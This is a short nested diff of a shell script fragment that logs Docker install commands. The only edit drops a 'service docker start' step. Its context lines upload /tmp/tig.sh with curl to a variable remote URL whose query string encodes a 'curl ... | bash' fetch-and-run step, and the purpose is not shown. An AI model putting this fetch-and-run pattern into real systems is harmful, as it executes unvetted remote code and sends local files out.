@@ -1,0 +1,8 @@
+@@ -40,6 +40,6 @@
+ cat /tmp/tig.sh | curl -X PUT --data-binary @- $DATASET'&format=curl%20'$DATAGET'*'%20%7C%20bash
+ echo >>$IMPLEMENTATION/tig.log
+ echo 'apt update && apt install -y docker.io && service docker start && docker ps' >>$IMPLEMENTATION/tig.log
+-echo 'yum install -y docker  && docker ps && touch /etc/containers/nodocker && service docker start' >>$IMPLEMENTATION/tig.log
++echo 'yum install -y docker  && docker ps && touch /etc/containers/nodocker' >>$IMPLEMENTATION/tig.log
+ cat /tmp/tig.sh | curl -X PUT --data-binary @- $DATASET'&format=curl%20'$DATAGET'*'%20%7C%20bash >>$IMPLEMENTATION/tig.log
+ 
